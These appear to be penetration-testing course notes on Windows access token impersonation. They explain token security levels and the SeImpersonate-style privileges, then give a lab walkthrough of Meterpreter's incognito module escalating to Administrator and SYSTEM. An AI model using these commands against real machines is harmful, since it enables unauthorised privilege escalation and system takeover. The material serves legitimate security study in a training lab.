# 3 - Access Token Impersonation

### **Windows Access Tokens**

* Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).
* A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.
* Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
* Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
* An access token will typically be assigned one of the following security levels:
  * **Impersonate-level** tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
  * **Delegate-level** tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.
  * Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
  * Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

### **Windows Privileges**

* The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.
* The following are the privileges that are required for a successful impersonation attack:
  * **SeAssignPrimaryToken**: This allows a user to impersonate tokens.
  * **SeCreateToken:** This allows a user to create an arbitrary token with administrative privileges.
  * **SeImpersonatePrivilege:** This allows a user to create a process under the security context of another user typically with administrative privileges.

### **The Incognito Module**

* Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
* We can use the incognito module to display a list of available tokens that we can impersonate.



## **Practical Demonstration**

#### Gaining initial access on the target PC.

We will utilize the Rejetto Http File Server service vuln like in previous session.

#### To the attack.

> This attack depends on a few factors:
>
> * what user accts are currently on the system.
> * which of these users has admin priv or are part of the Local Admin group.
> * if you find an access token that is available or you can impersonate, then you can impersonate or obtain the priv associated with that access token.
> * Though the assess token does not need to belong to a particular user.

```bash
# using metasploit.
# we have a 32bit meterpreter session.
pgrep explorer
migrate <explorer ID>
# notice we can't migrate our process to a 64bit process (explorer process) because of insufficient priv.
getprivs
# we also notice we have the "SeImpersonatePrivilege" meaning we can use this acct to impersonate other acct to impersonate other access tokens available.
# using the "incognito" module.
load incognito
# if the session died, thats because we tried migrating to a process initially.
# so run the exploit again.
exploit
load incognito
list_tokens -u # list the "-u" to list the user option to list the user acct access tokens.
# inorder to impersonat the "ATTACKDEFENSE\Administrator" token we use the "impersonate_token" cmd.
impersonate_token "ATTACKDEFENSE\Administrator"
getuid  # we have successfully elevated our priv.
getprivs # we get an "Operation denied", so lete migrate to a 64bit process 1st.
pgrep explorer
migrate <explorer ID>
getprivs  # we now have admin privs.
getuid  # we are administrator.

# we can also impersonate the "NT AUTHORITY\SYSTEM" token too.
impersonate_token "NT AUTHORITY\SYSTEM"
getuid  # we are now NT AUTHORITY.


```



